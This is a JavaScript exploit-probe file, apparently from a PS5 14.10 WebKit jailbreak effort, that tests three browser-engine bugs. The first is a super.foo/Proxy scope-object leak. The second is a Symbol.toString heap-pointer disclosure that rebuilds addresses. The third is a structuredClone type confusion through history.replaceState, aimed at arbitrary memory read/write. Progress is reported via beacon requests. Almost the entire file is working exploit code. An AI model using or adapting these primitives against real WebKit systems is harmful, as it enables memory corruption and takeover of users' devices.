// p160 — Relapse bug test on PS5 14.10
// Tests three independent WebKit bugs (exact Relapse patterns):
//   Phase 1: Scope object leak (super.foo + Proxy)
//   Phase 2: Symbol.toString address disclosure (924K-char string with heap pointers)
//   Phase 3: structuredClone type confusion (history.replaceState)
// If Phase 3 works → full arbitrary R/W → skip MetadataTable entirely
// Beacon prefix: V160-

(function() {
  'use strict';
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V160-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function hx(v) {
    var s = v.toString(16);
    return s.length < 2 ? '0' + s : s;
  }

  B('BOOT');

  // ═══════════════════════════════════════════
  // PHASE 1: Scope object leak (exact Relapse pattern)
  // The bug: LLInt's super.foo leaks JSScope as receiver when 'this' is undefined
  // ═══════════════════════════════════════════
  var leakedScope = null;
  try {
    // Must use class syntax — super.foo semantics require HomeObject
    var Leaker = eval('(class L { leak() { return super.foo; } })');
    Leaker.prototype.__proto__ = new Proxy({}, {
      get: function(target, property, receiver) {
        return receiver;
      }
    });
    var leakFn = Leaker.prototype.leak;
    // Call without receiver — in strict class method, 'this' = undefined
    // Bug: LLInt passes JSScope as receiver instead of undefined
    leakedScope = (function() { return leakFn(); })();

    if (leakedScope !== undefined && leakedScope !== null && leakedScope !== globalThis) {
      B('P1-SCOPE-OK-type=' + typeof leakedScope);
      // Check if it's really a scope (not window or undefined)
      try {
        var keys = Object.keys(leakedScope);
        B('P1-KEYS=' + keys.length);
      } catch(e) {
        B('P1-KEYS-ERR=' + (e.name || ''));
      }
    } else if (leakedScope === undefined) {
      B('P1-SCOPE-UNDEF');
    } else if (leakedScope === null) {
      B('P1-SCOPE-NULL');
    } else if (leakedScope === globalThis) {
      B('P1-SCOPE-GLOBAL');
    }
  } catch(e) {
    B('P1-ERR-' + (e.name || '') + '-' + (e.message || '').substring(0, 50));
  }

  // ═══════════════════════════════════════════
  // PHASE 2: Symbol.toString address disclosure
  // Even if scope leak fails, test Symbol.toString independently
  // ═══════════════════════════════════════════
  var symLeakWorked = false;
  try {
    // We need a scope object for this. If Phase 1 failed, try with a regular object
    var target = leakedScope || {};

    // Stuff properties to grow the object's backing store
    for (var i = 0; i < 512; i++) target['p' + i] = i;
    for (var j = 0; j < 8; j++) target[j] = 1.1 * j;
    B('P2-STUFFED');

    // Create objects we want to locate in memory
    var obj1 = { marker: 0x41414141 };
    var obj2 = { marker: 0x42424242 };

    // Create getter function and stuff target objects into its indexed properties
    var getterFn = function getterCarrier() { return 7; };
    getterFn[0] = obj1;
    // Fill with zeros to push obj2 far into the backing store
    for (var i = 1; i < 9000000; i++) getterFn[i] = 0;
    getterFn[1] = obj2;
    getterFn[2] = obj1;
    getterFn[3] = obj2;
    B('P2-GETTER-READY');

    // Define getter on scope/target and create Symbol wrapper
    Object.defineProperty(target, 'g', {
      get: getterFn,
      configurable: true
    });
    var symObj = Object(target.g);
    B('P2-SYMOBJ-type=' + typeof symObj);

    // Call Symbol.prototype.toString on the Symbol wrapper
    // This should produce a string with raw heap data
    var symbolToString = Symbol.prototype.toString;
    var leaked = symbolToString.call(symObj);
    B('P2-LEN=' + leaked.length);

    var EXPECTED_LEN = 924176;
    if ((leaked.length & 0xffffff) === (EXPECTED_LEN & 0xffffff)) {
      B('P2-MATCH-YES');
      symLeakWorked = true;

      // Read uint16 words at the leak offset
      var words = [];
      for (var w = 0; w < 16; w++) {
        words.push(leaked.charCodeAt(7 + w));
      }

      // Raw hex dump of first 16 words
      var wordHex = '';
      for (var w = 0; w < 16; w++) {
        wordHex += ('0000' + words[w].toString(16)).slice(-4);
      }
      B('P2-W-' + wordHex);

      // Reconstruct pointers (each pointer = 4 uint16 words = 64 bits, top 16 = 0)
      function ptrFrom(ws, off) {
        var lo = ws[off] + ws[off + 1] * 0x10000;
        var hi = ws[off + 2];
        if (ws[off + 3] !== 0) return -1;
        return lo + hi * 0x100000000;
      }

      var p0 = ptrFrom(words, 0);
      var p1 = ptrFrom(words, 4);
      var p2 = ptrFrom(words, 8);
      var p3 = ptrFrom(words, 12);

      B('P2-P0=' + (p0 > 0 ? p0.toString(16) : 'bad'));
      B('P2-P1=' + (p1 > 0 ? p1.toString(16) : 'bad'));

      // Validate consistency: p0==p2, p1==p3
      if (p0 > 0x100000000 && p0 < 0x1000000000000) B('P2-PLAUSIBLE0');
      if (p1 > 0x100000000 && p1 < 0x1000000000000) B('P2-PLAUSIBLE1');
      if (p0 === p2 && p1 === p3) B('P2-CONSISTENT');
    } else {
      B('P2-MATCH-NO-got=' + leaked.length);
      // Dump first few chars anyway
      var sample = '';
      for (var s = 0; s < Math.min(32, leaked.length); s++) {
        sample += ('0000' + leaked.charCodeAt(s).toString(16)).slice(-4);
      }
      B('P2-SAMPLE-' + sample);
    }
  } catch(e) {
    B('P2-ERR-' + (e.name || '') + '-' + (e.message || '').substring(0, 50));
  }

  // ═══════════════════════════════════════════
  // PHASE 3: structuredClone type confusion test
  // ═══════════════════════════════════════════
  try {
    B('P3-START');

    // Test 1: Basic history.replaceState
    history.replaceState([1, 2, 3], '');
    var c1 = history.state;
    B('P3-BASIC-' + (c1 && c1.length === 3 ? 'OK' : 'FAIL'));

    // Test 2: BigInt in structuredClone
    try {
      history.replaceState([1n << 40n], '');
      var c2 = history.state;
      B('P3-BIGINT-' + (c2 ? 'OK' : 'FAIL'));
    } catch(e) {
      B('P3-BIGINT-ERR-' + (e.message || '').substring(0, 30));
    }

    // Test 3: Duplicate reference detection
    var shared = { x: 1 };
    history.replaceState([shared, shared], '');
    var c3 = history.state;
    if (c3 && c3[0] === c3[1]) {
      B('P3-DEDUP-YES');
    } else {
      B('P3-DEDUP-NO');
    }

    // Test 4: ArrayBuffer transfer via MessageChannel
    try {
      var ch = new MessageChannel();
      var buf = new ArrayBuffer(0x100);
      ch.port1.postMessage(0, [buf]);
      B('P3-XFER-detached=' + (buf.byteLength === 0));
      ch.port1.close();
      ch.port2.close();
    } catch(e) {
      B('P3-XFER-ERR-' + (e.message || '').substring(0, 30));
    }

    // Test 5: Full Relapse-style graph with large array + CONTROL_INDEX
    var CONTROL_INDEX = 0xffff;
    var refObj = { marker: 0x51515151 };
    var filler = new Array(0xfffd);
    var pos = 0;
    try {
      filler[pos++] = 1n << 40n;
    } catch(e) {
      filler[pos++] = 0;
    }
    while (pos < filler.length) filler[pos++] = {};

    var graph = new Array(CONTROL_INDEX + 1);
    graph[0] = filler;
    graph[1] = refObj;
    graph[2] = refObj;
    graph[CONTROL_INDEX] = -64000;

    history.replaceState(graph, '');
    B('P3-GRAPH-STORED');

    var clone = history.state;
    if (clone) {
      B('P3-CLONE-len=' + clone.length);
      if (clone[1] === clone[2]) {
        B('P3-STILL-SAME');
      } else {
        B('P3-DIFF-type1=' + typeof clone[1] + '-type2=' + typeof clone[2]);
        if (clone[2] instanceof Uint8Array) {
          B('P3-CONFUSION-SUCCESS');
          B('P3-VIEW-len=' + clone[2].length);
          var viewHex = '';
          for (var b = 0; b < Math.min(48, clone[2].length); b++) {
            viewHex += hx(clone[2][b]);
          }
          B('P3-VIEW-' + viewHex);
        }
      }
    }
    history.replaceState(null, '');
  } catch(e) {
    B('P3-ERR-' + (e.name || '') + '-' + (e.message || '').substring(0, 50));
  }

  B('DONE');
})();
